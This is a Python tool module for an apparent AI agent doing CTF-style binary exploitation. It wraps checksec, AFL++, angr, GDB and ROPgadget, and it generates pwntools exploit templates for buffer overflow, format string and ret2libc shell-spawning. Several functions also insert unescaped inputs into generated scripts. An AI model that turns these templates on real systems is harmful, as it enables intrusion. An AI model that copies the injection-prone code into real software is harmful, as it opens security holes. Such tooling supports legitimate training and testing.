"""
pwn_tools.py — Binary exploitation analysis and exploit generation tools.
"""
from __future__ import annotations


import subprocess
import tempfile
from pathlib import Path

from agent.tool_registry import ToolSpec


def _run(cmd: list[str], timeout: int = 30, input_bytes: bytes | None = None) -> str:
    try:
        proc = subprocess.run(
            cmd, capture_output=True, timeout=timeout, input=input_bytes
        )
        out = proc.stdout.decode("utf-8", errors="replace")
        err = proc.stderr.decode("utf-8", errors="replace")
        return (out + ("\n[STDERR]\n" + err if err.strip() else "")).strip() or "(no output)"
    except FileNotFoundError:
        return f"ERROR: {cmd[0]} not found."
    except subprocess.TimeoutExpired:
        return f"TIMEOUT after {timeout}s"


# ─────────────────────────────────────────── tools ──────────────────────────

def run_binary(binary_path: str, input_data: str = "") -> str:
    """Execute a binary with given stdin input and capture output."""
    return _run([binary_path], timeout=10, input_bytes=input_data.encode())


def checksec(binary_path: str) -> str:
    """Check security mitigations: NX, PIE, RELRO, canary, FORTIFY."""
    result = _run(["checksec", "--file=" + binary_path])
    if "ERROR" in result:
        # fallback: use pwntools python API
        code = f"""
import pwnlib.elf
e = pwnlib.elf.ELF('{binary_path}', checksec=False)
print('NX:', e.nx)
print('PIE:', e.pie)
print('Canary:', e.canary)
print('RELRO:', e.relro)
"""
        return _run(["python3", "-c", code])
    return result


def generate_pwntools_exploit(binary_path: str, vulnerability: str = "buffer_overflow") -> str:
    """
    Generate a pwntools exploit script template for the given vulnerability type.
    Supported: buffer_overflow, format_string, ret2libc, rop_chain
    """
    templates = {
        "buffer_overflow": f"""
from pwn import *

elf = ELF('{binary_path}')
p = process(elf.path)

# TODO: find offset with cyclic()
offset = 64   # adjust after running: cyclic(200) and inspecting crash

payload = flat(
    b'A' * offset,
    elf.symbols.get('win', p64(0xdeadbeef))  # target address
)

p.sendline(payload)
p.interactive()
""",
        "format_string": f"""
from pwn import *

elf = ELF('{binary_path}')
p = process(elf.path)

# Leak stack addresses first
for i in range(1, 20):
    p = process(elf.path)
    p.sendline(f'%{i}$p'.encode())
    leak = p.recvline()
    print(f'[%{i}$p] =', leak)
    p.close()
""",
        "ret2libc": f"""
from pwn import *

elf = ELF('{binary_path}')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process(elf.path)

# Stage 1: Leak libc address via puts/printf
# Stage 2: Calculate libc base
# Stage 3: Call system('/bin/sh')

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

payload = flat(
    b'A' * 64,           # offset to return address
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']  # return to main for stage 2
)
p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8, b'\\x00'))
libc.address = leak - libc.symbols['puts']
print(f'libc base: {{libc.address:#x}}')
p.interactive()
""",
    }
    template = templates.get(vulnerability, templates["buffer_overflow"])
    return f"# Exploit template for {vulnerability}\n{template}"


def fuzz_binary(binary_path: str, input_dir: str = "/tmp/afl_in") -> str:
    """Launch AFL++ fuzzing session (non-blocking, returns setup instructions)."""
    import os
    os.makedirs(input_dir, exist_ok=True)
    seed = Path(input_dir) / "seed"
    if not seed.exists():
        seed.write_bytes(b"AAAA\n")

    return f"""AFL++ fuzzing setup:
  Binary:    {binary_path}
  Input dir: {input_dir}
  Output:    /tmp/afl_out

Run:
  afl-fuzz -i {input_dir} -o /tmp/afl_out -- {binary_path} @@

Check crashes:
  ls /tmp/afl_out/default/crashes/

Triage a crash:
  cat /tmp/afl_out/default/crashes/<file> | ./{binary_path}
"""


def symbolic_execution(binary_path: str, find_str: str = "flag", avoid_str: str = "") -> str:
    """Use angr to symbolically execute a binary and find inputs reaching 'find_str'."""
    code = f"""
import angr, claripy, sys

proj = angr.Project('{binary_path}', auto_load_libs=False)
state = proj.factory.entry_state(
    stdin=angr.SimFile('/dev/stdin', content=claripy.BVS('stdin', 200*8))
)

simgr = proj.factory.simulation_manager(state)

# Find address containing target string
find_addrs = []
avoid_addrs = []

for block in proj.factory.block(proj.entry).successors():
    pass  # structural scan would go here

simgr.explore(find=lambda s: b'{find_str}' in s.posix.dumps(1))

if simgr.found:
    found = simgr.found[0]
    print('FOUND! Input:', found.posix.dumps(0))
    print('Output:', found.posix.dumps(1))
else:
    print('No solution found.')
"""
    with tempfile.NamedTemporaryFile(suffix=".py", mode="w", delete=False) as f:
        f.write(code)
        fname = f.name
    return _run(["python3", fname], timeout=120)


def crash_analysis(binary_path: str, crash_input: str = "") -> str:
    """Run GDB on a crashing input to identify crash location and registers."""
    gdb_commands = f"""
set pagination off
run <<< '{crash_input}'
bt
info registers
x/20x $rsp
quit
"""
    with tempfile.NamedTemporaryFile(mode="w", suffix=".gdb", delete=False) as f:
        f.write(gdb_commands)
        script = f.name
    return _run(["gdb", "-batch", "-x", script, binary_path], timeout=20)


def find_rop_gadgets(binary_path: str) -> str:
    """Find useful ROP gadgets using ROPgadget."""
    return _run(["ROPgadget", "--binary", binary_path, "--rop"], timeout=30)


def cyclic_offset(binary_path: str, pattern_length: str = "200") -> str:
    """Generate a cyclic pattern and find overflow offset using pwntools."""
    code = f"""
from pwn import *
pat = cyclic(int('{pattern_length}'))
print('Pattern:', pat[:80], '...')
# Feed this to the binary, find crash EIP/RIP value, then:
# cyclic_find(0x<crash_value>)
"""
    return _run(["python3", "-c", code])


# ─────────────────────────────────────────── tool specs ─────────────────────

PWN_TOOLS: list[ToolSpec] = [
    ToolSpec("run_binary", "Execute a binary with stdin input", {"binary_path": "string", "input_data": "string (optional)"}, run_binary, "pwn"),
    ToolSpec("checksec", "Check binary security mitigations (NX, PIE, RELRO, canary)", {"binary_path": "string"}, checksec, "pwn"),
    ToolSpec("generate_pwntools_exploit", "Generate a pwntools exploit template (buffer_overflow|format_string|ret2libc|rop_chain)", {"binary_path": "string", "vulnerability": "string (optional)"}, generate_pwntools_exploit, "pwn"),
    ToolSpec("fuzz_binary", "Set up AFL++ fuzzing for a binary", {"binary_path": "string", "input_dir": "string (optional)"}, fuzz_binary, "pwn"),
    ToolSpec("symbolic_execution", "Use angr symbolic execution to find flag-producing inputs", {"binary_path": "string", "find_str": "string (optional)"}, symbolic_execution, "pwn"),
    ToolSpec("crash_analysis", "Analyse a crashing input in GDB to determine crash site", {"binary_path": "string", "crash_input": "string (optional)"}, crash_analysis, "pwn"),
    ToolSpec("find_rop_gadgets", "Find ROP gadgets in a binary via ROPgadget", {"binary_path": "string"}, find_rop_gadgets, "pwn"),
    ToolSpec("cyclic_offset", "Generate cyclic pattern to find buffer overflow offset", {"binary_path": "string", "pattern_length": "string (optional, default=200)"}, cyclic_offset, "pwn"),
]
